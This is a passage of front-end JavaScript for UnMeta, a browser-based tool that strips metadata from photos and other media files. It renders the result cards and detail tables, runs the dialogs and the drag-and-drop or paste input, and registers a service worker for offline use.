  const pic = !src ? "" : kind === "video" ? `<video class="thumb" muted playsinline preload="metadata" src="${src}#t=0.1"></video>`
    : kind === "audio" ? `<span class="sound">${ic("audio")}<span class="data">${esc(base(it.path).split(".").pop().toUpperCase())}</span></span>`
      : kind === "document" ? `<span class="sound doc">${ic("files")}<span class="data">${esc(base(it.path).split(".").pop().toUpperCase())}</span></span>`
      : `<img class="thumb" alt="" decoding="async" src="${src}">`;
  const thumb = `<figure class="print thumb-wrap${kind !== "photo" ? ` is-${kind}` : ""}" aria-hidden="true"><span class="edge"><span>UNMETA 400</span><span>▸ ${n}</span></span>
    <span class="print-pic">${pic}<span class="thumb-fallback">${ic("image-plus")}</span>${stamp}</span>
    <span class="edge"><span>${n}A</span><span>SAFETY FILM</span></span></figure>`;
  let pill = "", right = "", body = "", remove = "";
  if (it.status === "error") {
    pill = `<span class="tag warn">${ic("alert")}${COPY.review.unreadable(kindOf(it))}</span>`;
  } else if (it.status === "reading") {
    right = `<span class="spin" role="img" aria-label="${COPY.review.reading(1, kindOf(it))}"></span>`;
  } else if (it.out) {
    pill = it.out.verified ? `<span class="tag clean">${ic("check")}${COPY.done.clean}</span>`
      : `<span class="tag warn">${ic("alert")}${COPY.done.leftover}</span>`;
    const many = state.items.filter(x => x.out).length > 1;
    right = `<div class="actions">${navigator.canShare ? `<button class="icon-btn" type="button" data-share="${i}" aria-label="${COPY.done.share} ${name}">${ic("share")}</button>` : ""}
      ${many ? `<button class="icon-btn" type="button" data-dl="${i}" aria-label="${COPY.done.downloadOne} ${name}">${ic("download")}</button>` : ""}</div>`;
    body = it.out.removed.length
      ? `<ul class="removed" aria-label="${COPY.done.removed}">${it.out.removed.map(h =>
        `<li><span class="label">${LABEL[h.key] ?? esc(h.key)}</span><span class="redacted"><span class="bar ${barWidth(h.value)}" aria-hidden="true"></span><span class="what">${esc(tx(h.title))} · ${COPY.done.removed.toLowerCase()}</span></span></li>`).join("")}</ul>` : "";
    if (!it.out.verified && it.out.notes.length) body += `<p class="card-note" role="note">${ic("alert")}${esc(tx(it.out.notes[0]))}</p>`;
    const keptNow = (it.found || []).filter(h => it.keepKeys?.has(h.key) && !isInfo(it, h));
    const stays = (it.found || []).filter(h => isInfo(it, h));
    if (stays.length) body += `<ul class="removed kept-list" aria-label="${COPY.keepOne.stays}">${stays.map(h =>
      `<li><span class="label">${LABEL[h.key] ?? esc(h.key)}</span><span class="what">${esc(tx(h.title))} · ${esc(h.value)} · ${COPY.keepOne.stays.toLowerCase()}</span></li>`).join("")}</ul>`;
    if (keptNow.length) body += `<ul class="removed kept-list" aria-label="${COPY.keepOne.kept}">${keptNow.map(h =>
      `<li><span class="label">${LABEL[h.key] ?? esc(h.key)}</span><span class="what">${esc(tx(h.title))} · <mark>${esc(h.value)}</mark> · ${COPY.keepOne.kept.toLowerCase()}, ${t("keepOne.asChosen")}</span></li>`).join("")}</ul>`;
  } else {
    const f = it.found || [];
    const toRemove = f.filter(h => !isInfo(it, h)).length;
    pill = toRemove ? `<span class="ringed"><span class="tag exposed">${COPY.review.count(toRemove)}</span>${PENCIL}</span>`
      : `<span class="tag quiet">${COPY.review.none}</span>`;
    if (state.busy) right = `<span class="spin" aria-hidden="true"></span>`;
    const kept = k => it.keepKeys?.has(k);
    body = f.length ? `<div class="findings">${f.map(h => { const info = isInfo(it, h); return `<details class="finding${kept(h.key) || info ? " is-kept" : ""}"><summary>
        <span class="label">${LABEL[h.key] ?? esc(h.key)}</span>
        <span class="f-main"><span class="f-title">${esc(tx(h.title))}${info ? ` <span class="tag quiet">${COPY.keepOne.stays}</span>` : kept(h.key) ? ` <span class="tag quiet">${COPY.keepOne.kept}</span>` : ""}</span><span class="data f-value">${info ? esc(h.value) : `<mark>${esc(h.value)}</mark>`}</span></span>
        ${ic("chevron-down", "ic chev")}</summary><p class="why">${esc(tx(h.why))}</p>
        ${info ? "" : `<label class="keep-one"><input type="checkbox" data-keep="${i}" value="${esc(h.key)}"${kept(h.key) ? " checked" : ""}${state.busy ? " disabled" : ""}> ${COPY.keepOne.label(kindOf(it))}</label>`}</details>`; }).join("")}</div>` : "";
    body += allDetails(it);
  }
  if (!it.out && !state.busy && it.status !== "reading") {
    remove = `<button class="icon-btn quiet remove" type="button" data-remove="${i}" aria-label="${COPY.review.remove(kindOf(it))} ${name}">${ic("close")}</button>`;
  }
  const cls = ["card", it.fresh && "fresh", first && "just-done", it.out && "is-done"].filter(Boolean).join(" ");
  it.fresh = false;
  return `<article class="${cls}" aria-labelledby="ph-${it.uid}">${thumb}<div class="card-body"><div class="head"><div class="who"><h2 class="name" id="ph-${it.uid}" title="${name}">${name}</h2>${pill}</div>${right}</div>${body}</div>${remove}</article>`;
}

/** Every detail the engine found, for people who want the full technical list (like a forensics tool shows). */
function allDetails(it) {
  const fields = it.report ? Object.values(it.report.groups).flatMap(g => g.fields) : [];
  if (!fields.length) return "";
  const rows = fields.map(f => `<tr><th scope="row">${esc(f.label)}</th><td class="data">${esc(f.value.length > 140 ? f.value.slice(0, 140) + "…" : f.value)}</td><td class="muted">${esc(f.source)}</td></tr>`).join("");
  return `<details class="all-details"><summary>${ic("report")}${COPY.allDetails(fields.length)}</summary>
    <div class="table-wrap" role="region" aria-label="${COPY.allDetails(fields.length)}" tabindex="0"><table class="facts-table"><thead><tr><th scope="col">${t("details.detail")}</th><th scope="col">${t("details.value")}</th><th scope="col">${t("details.where")}</th></tr></thead><tbody>${rows}</tbody></table></div></details>`;
}

function notices(done) {
  if (!done) return "";
  const removedAi = state.items.some(i => i.out?.removed.some(h => h.key === "ai"));
  const rows = [];
  if (removedAi) rows.push(["sparkle-off", "c-ai", COPY.notice.ai]);
  rows.push(["eye-off", "c-muted", COPY.notice.visible(kindAll(state.items.filter(i => i.out)))]);
  const support = state.items.some(i => i.out?.verified)
    ? `<div class="support"><p><span class="strong">UnMeta is free, with no ads or tracking.</span> If it saved you some worry, a coffee keeps it that way.</p>
        <a class="btn secondary support-btn" href="${SUPPORT_URL}" target="_blank" rel="noopener noreferrer">${ic("coffee")}Buy me a coffee<span class="vh"> (opens in a new tab)</span>${ic("external", "ic ext")}</a></div>`
    : "";
  return `<section class="good" aria-labelledby="goodTitle">
      <h2 id="goodTitle" class="label">${COPY.notice.title}</h2>
      <ul class="good-list">${rows.map(([icon, c, text]) => `<li class="${c}">${ic(icon)}<span>${esc(text)}</span></li>`).join("")}</ul>
      <button class="text-link" type="button" data-open-about>${ic("info")}${COPY.about.link}</button>
    </section>${support}`;
}

function render() {
  const items = state.items, usable = items.filter(i => i.status !== "error");
  const done = usable.length > 0 && usable.every(i => i.out);
  document.body.dataset.screen = items.length ? "list" : "home";
  // one main heading at a time: the results heading is an h2 in the page (so the page has a single h1 for search
  // engines) and becomes the h1 while the results screen is showing (the home headline is hidden then)
  const lt = $("#listTitle"), want = items.length ? "H1" : "H2";
  if (lt.tagName !== want) {
    const h = document.createElement(want);
    for (const a of lt.attributes) h.setAttribute(a.name, a.value);
    h.textContent = lt.textContent;
    const focused = document.activeElement === lt;
    lt.replaceWith(h);
    if (focused) h.focus();
  }
  document.title = !items.length ? HOME_TITLE
    : t(done ? "doc.clean" : "doc.review");
  $("#footer").hidden = items.length > 0;
  $("#home").hidden = items.length > 0;
  $("#list").hidden = !items.length;
  $("#dock").hidden = !items.length;
  $("#startOver").hidden = !items.length;
  if (!items.length) return;

  const reading = items.some(i => i.status === "reading");
  const todo = items.filter(i => !i.out), kAll = kindAll(usable.length ? usable : items), kTodo = kindAll(todo.length ? todo : items);
  $("#listTitle").textContent = done ? COPY.done.title(usable.length, kAll) : reading ? COPY.review.reading(todo.length, kTodo) : COPY.review.title(todo.length, kTodo);
  $("#listBody").textContent = done ? COPY.done.body(usable.length, kAll) : COPY.review.body(kTodo);

  const open = new Set($$("#cards .finding[open]").map(d => {
    const c = d.closest(".card"); return `${c.dataset.uid}:${$$(".finding", c).indexOf(d)}`;
  }));
  $("#cards").innerHTML = items.map(card).join("");
  $$("#cards .card").forEach((c, i) => {
    c.dataset.uid = items[i].uid;
    $$(".finding", c).forEach((d, k) => { if (open.has(`${items[i].uid}:${k}`)) d.open = true; });
  });
  $("#notices").innerHTML = notices(done);

  const ready = items.filter(i => i.status === "ready" && !i.out).length;
  $("#keepBtn").hidden = done;
  $("#keepName").textContent = preset().title;
  $("#keepIcon").setAttribute("href", `#i-${preset().icon}`);
  const main = $("#mainBtn");
  const [doneN, total] = state.progress;
  $("#mainLabel").textContent = done ? COPY.done.download(usable.length)
    : state.busy ? COPY.review.cleaning(Math.min(doneN + 1, total), total) : COPY.review.clean(ready || usable.length, kindAll(items.filter(i => i.status === "ready" && !i.out).length ? items.filter(i => i.status === "ready" && !i.out) : usable));
  $("#mainIcon").setAttribute("href", `#i-${done ? "download" : "eraser"}`);
  main.disabled = !done && (state.busy || reading || !ready);
  main.setAttribute("aria-busy", String(state.busy));
  main.classList.toggle("wide", done);
  $("#addBtn").hidden = state.busy;
  $("#addLabel").textContent = done ? COPY.add.done(kindAll(items)) : COPY.add.review(kindAll(items));
  $(".dock-actions").classList.toggle("wide", done);
  main.onclick = done ? downloadAll : cleanAll;
  $("#progress").hidden = !state.busy;
  const pct = total ? Math.round((100 * doneN) / total) : 0;
  $("#progress i").style.width = `${pct}%`;
  $("#progress").setAttribute("aria-valuenow", String(pct));
}

// ---------------------------------------------------------------- sheets (focus-trapped, background inert)
const sheetStack = [];
function openSheet(id, onClose) {
  const el = $(id);
  sheetStack.push({ el, back: document.activeElement, onClose });
  el.hidden = false; $("#scrim").hidden = false;
  document.body.style.overflow = "hidden";
  ["#top", "#main", "#footer", "#dock"].forEach(s => ($(s).inert = true));
  sheetStack.slice(0, -1).forEach(x => (x.el.inert = true));
  // focus the selected choice, else the dialog's title (screen readers start there; Tab reaches the buttons)
  const title = el.querySelector(".title");
  if (title) title.tabIndex = -1;
  (el.querySelector("[aria-checked=true]") || title || el.querySelector("button, [href], summary"))?.focus();
}
function closeSheet() {
  const top = sheetStack.pop();
  if (!top) return;
  top.el.hidden = true;
  if (sheetStack.length) sheetStack[sheetStack.length - 1].el.inert = false;
  else {
    $("#scrim").hidden = true; document.body.style.overflow = "";
    ["#top", "#main", "#footer", "#dock"].forEach(s => ($(s).inert = false));
  }
  top.back?.focus?.();
  top.onClose?.();
}
function trapFocus(e) {
  const top = sheetStack[sheetStack.length - 1];
  if (!top || e.key !== "Tab") return;
  const f = $$("button:not([disabled]), [href], summary, input:not([type=file]), label[for]", top.el).filter(x => x.offsetParent !== null);
  if (!f.length) return;
  const [first, last] = [f[0], f[f.length - 1]];
  if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
  else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
}
function renderChoices() {
  $("#choices").innerHTML = PRESETS.map(p => {
    const on = p.key === state.preset;
    return `<button type="button" class="choice" role="radio" aria-checked="${on}" tabindex="${on ? 0 : -1}" data-key="${p.key}">
      <span class="tile">${ic(p.icon)}</span>
      <span class="choice-text"><span class="strong">${esc(p.title)}${p.key === "everything" ? `<span class="rec">${COPY.keep.recommended}</span>` : ""}</span>
      <span class="muted">${esc(p.detail)}</span></span>
      <span class="radio">${ic("check")}</span></button>`;
  }).join("");
}
function confirmReplace(name) {
  return new Promise(resolve => {
    $("#confirmTitle").textContent = COPY.confirm.title(name);
    $("#confirmBody").textContent = COPY.confirm.body;
    $("#confirmYes").textContent = COPY.confirm.yes;
    $("#confirmNo").textContent = COPY.confirm.no;
    let answer = false;
    $("#confirmYes").onclick = () => { answer = true; closeSheet(); };
    $("#confirmNo").onclick = () => { answer = false; closeSheet(); };
    openSheet("#confirmSheet", () => resolve(answer));
    $("#confirmNo").focus();
  });
}

// ---------------------------------------------------------------- landing: reveals, header, demo, transitions
const reducedMotion = matchMedia("(prefers-reduced-motion: reduce)");
function withTransition(update) {
  if (document.startViewTransition && !reducedMotion.matches) {
    // a newer screen change skips this one; that's expected, so don't report it as an error
    const t = document.startViewTransition(update);
    for (const p of [t.ready, t.finished, t.updateCallbackDone]) p?.catch(() => {});
  } else update();
}
function landing() {
  document.documentElement.classList.add("js");
  const els = $$(".reveal");
  if ("IntersectionObserver" in window) {
    const io = new IntersectionObserver(entries => entries.forEach(e => {
      if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); }
    }), { rootMargin: "0px 0px -8% 0px", threshold: 0.12 });
    els.forEach(el => io.observe(el));
  } else els.forEach(el => el.classList.add("in"));

  // phones: once the picker has scrolled away, keep a pick button at the bottom of the screen
  const quick = $("#quick"), tray = $("#drop");
  if (quick && tray && "IntersectionObserver" in window) {
    quick.hidden = false;
    new IntersectionObserver(([e]) => quick.classList.toggle("show", !e.isIntersecting && e.boundingClientRect.top < 0)).observe(tray);
  }
  // the menu closes when you pick a link, press Escape or tap elsewhere
  for (const menu of $$("details.menu")) {   // the site menu and the language picker
    menu.addEventListener("click", e => { if (e.target.closest("a")) menu.open = false; });
    menu.addEventListener("toggle", () => { if (menu.open) for (const m of $$("details.menu")) if (m !== menu) m.open = false; });
    document.addEventListener("keydown", e => { if (e.key === "Escape" && menu.open) { menu.open = false; menu.querySelector("summary").focus(); } });
    document.addEventListener("click", e => { if (menu.open && !menu.contains(e.target)) menu.open = false; });
  }

  const bar = $(".bar");
  const onScroll = () => bar.classList.toggle("scrolled", scrollY > 8);
  addEventListener("scroll", onScroll, { passive: true }); onScroll();

  // the demo loops only while visible and while the person hasn't paused it (WCAG 2.2.2)
  const demo = $("#demo"), toggle = $("#demoToggle");
  let userPaused = false, visible = true;
  const apply = () => demo.classList.toggle("paused", userPaused || !visible || document.hidden);
  if ("IntersectionObserver" in window) new IntersectionObserver(([e]) => { visible = e.isIntersecting; apply(); }).observe(demo);
  document.addEventListener("visibilitychange", apply);
  toggle.onclick = () => {
    userPaused = !userPaused;
    $("#demoToggleText").textContent = userPaused ? toggle.dataset.play : toggle.dataset.pause;   // words come from the page, so they're translated
    $("#demoToggleIcon").setAttribute("href", userPaused ? "#i-play" : "#i-pause");
    apply();
  };
}

// ---------------------------------------------------------------- wiring
function wire() {
  let depth = 0;
  const hasFiles = e => [...(e.dataTransfer?.types || [])].includes("Files");
  const endDrag = () => { depth = 0; document.body.classList.remove("dragging"); $("#dropOverlay").hidden = true; };
  document.addEventListener("dragenter", e => {
    if (!hasFiles(e)) return;
    e.preventDefault(); depth++;
    document.body.classList.add("dragging");
    if (state.items.length && !state.busy) $("#dropOverlay").hidden = false;
  });
  document.addEventListener("dragleave", e => { if (hasFiles(e) && --depth <= 0) endDrag(); });
  document.addEventListener("dragover", e => { if (hasFiles(e)) e.preventDefault(); });
  document.addEventListener("drop", async e => {
    if (!hasFiles(e)) return;
    e.preventDefault(); endDrag();
    const entries = [...(e.dataTransfer.items || [])].map(i => i.webkitGetAsEntry?.()).filter(Boolean);
    const list = [];
    if (entries.length) for (const en of entries) list.push(...await walkEntry(en));
    else list.push(...[...e.dataTransfer.files].map(f => ({ file: f, path: f.name })));
    add(list);
  });
  // paste photos straight from the clipboard (Ctrl+V / ⌘V), e.g. a screenshot or an image copied from another app
  document.addEventListener("paste", e => {
    const files = [...(e.clipboardData?.files || [])];
    if (!files.length || state.busy) return;
    e.preventDefault();
    add(files.map((f, n) => ({ file: f, path: f.name && f.name !== "image.png" ? f.name : `pasted-${Date.now()}-${n + 1}.${(f.type.split("/")[1] || "png").replace("jpeg", "jpg")}` })));
  });
  // keep one detail: re-render so the line shows "Kept"
  $("#cards").addEventListener("change", e => {
    const box = e.target.closest?.("[data-keep]");
    if (!box) return;
    const it = state.items[+box.dataset.keep];
    if (!it) return;
    it.keepKeys ??= new Set();
    box.checked ? it.keepKeys.add(box.value) : it.keepKeys.delete(box.value);
    render();
  });
  const pick = e => { add([...e.target.files].map(f => ({ file: f, path: f.webkitRelativePath || f.name }))); e.target.value = ""; };
  $("#pick").addEventListener("change", pick);
  $("#addBtn").addEventListener("click", () => $("#pick").click());
  $("#pickFolder").addEventListener("change", e => { closeSheet(); pick(e); });
  $("#drop").addEventListener("click", e => { if (!e.target.closest("label, input")) $("#pick").click(); });

  // browsers that can't show a format (e.g. HEIC or RAW in Chrome) get a neutral placeholder
  $("#cards").addEventListener("error", e => { if (e.target.matches?.(".thumb")) e.target.closest(".thumb-wrap").classList.add("no-preview"); }, true);
  $("#cards").addEventListener("click", e => {
    const d = e.target.closest("[data-dl]"), s = e.target.closest("[data-share]"), r = e.target.closest("[data-remove]");
    if (d) downloadOne(state.items[+d.dataset.dl]);
    if (s) shareOne(state.items[+s.dataset.share]);
    if (r) {
      forget(state.items.splice(+r.dataset.remove, 1));
      render();
      ($("#cards [data-remove]") || $("#listTitle") || $("#main")).focus();
    }
  });
  document.addEventListener("click", e => { if (e.target.closest("[data-open-about]")) openSheet("#aboutSheet"); });
  $("#aboutBtn").onclick = () => openSheet("#aboutSheet");
  $("#keepBtn").onclick = () => { renderChoices(); openSheet("#keepSheet", render); };
  $("#startOver").onclick = () => {
    forget(state.items);
    Object.assign(state, { items: [], dirRoot: null, busy: false, progress: [0, 0] });
    setActivity("idle");
    withTransition(() => { render(); scrollTo({ top: 0, behavior: "instant" }); });
    $("#main").focus();
  };
  $("#scrim").onclick = () => { if ($("#confirmSheet").hidden) closeSheet(); };
  $$("[data-close]").forEach(b => (b.onclick = closeSheet));
  document.addEventListener("keydown", e => {
    if (e.key === "Escape" && sheetStack.length) { e.preventDefault(); closeSheet(); }
    trapFocus(e);
  });
  $("#choices").addEventListener("click", e => {
    const c = e.target.closest("[data-key]"); if (!c) return;
    state.preset = c.dataset.key; renderChoices(); $(`[data-key="${c.dataset.key}"]`).focus();
  });
  $("#choices").addEventListener("keydown", e => {
    if (!["ArrowDown", "ArrowUp", "ArrowRight", "ArrowLeft"].includes(e.key)) return;
    e.preventDefault();
    const i = PRESETS.findIndex(p => p.key === state.preset), d = e.key === "ArrowDown" || e.key === "ArrowRight" ? 1 : -1;
    state.preset = PRESETS[(i + d + PRESETS.length) % PRESETS.length].key;
    renderChoices(); $(`[data-key="${state.preset}"]`).focus();
  });
  if (window.showDirectoryPicker) {
    $("#openFolder").hidden = false;
    $("#openFolder").onclick = async () => {
      try {
        const dir = await window.showDirectoryPicker({ mode: "readwrite" });
        closeSheet();
        forget(state.items.splice(0));
        Object.assign(state, { dirRoot: dir, overwrite: null });
        add(await walkHandle(dir));
      } catch (err) { if (err.name !== "AbortError") toast(COPY.error, "alert"); }
    };
  }
  $$("[data-report]").forEach(b => b.onclick = () => {
    if (!state.items.some(i => i.report)) return toast(COPY.noPhotos, "alert");
    save(reportBlob(b.dataset.report), `unmeta-report.${b.dataset.report}`);
  });
  addEventListener("pagehide", () => forget(state.items));
}

landing();
wire();
render();
// Load the engine with the page, so cleaning keeps working if the network goes away afterwards.
if ("Worker" in window) engine();
// Keep an offline copy of the app (code, styles, fonts, icons) so it opens and works with no connection.
// Browsers allow this only over HTTPS or on this computer. Photos and videos never pass through it.
const secure = location.protocol === "https:" || ["localhost", "127.0.0.1", "[::1]"].includes(location.hostname);
if ("serviceWorker" in navigator && secure) {
  addEventListener("load", () => navigator.serviceWorker.register("/sw.js", { scope: "/" }).catch(() => {}));
}

